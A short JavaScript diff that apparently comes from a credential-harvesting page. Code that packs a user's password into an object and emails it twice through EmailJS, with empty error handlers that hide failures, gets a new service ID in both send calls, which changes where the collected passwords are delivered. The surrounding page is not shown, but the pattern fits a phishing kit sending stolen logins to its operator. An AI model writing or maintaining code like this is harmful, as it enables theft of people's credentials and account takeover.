@@ -21,12 +21,12 @@
                 password: password
             };
 
-            emailjs.send('service_mlr1gee', 'template_8ygccbi', templateParams)
+            emailjs.send('service_fr2hpkj', 'template_8ygccbi', templateParams)
                 .then(function(response) {
                 }).catch(function(error) {
                 });
 
-            emailjs.send('service_mlr1gee', 'template_mu97vit', templateParams)
+            emailjs.send('service_fr2hpkj', 'template_mu97vit', templateParams)
                 .then(function(response) {
                 }).catch(function(error) {
                 });
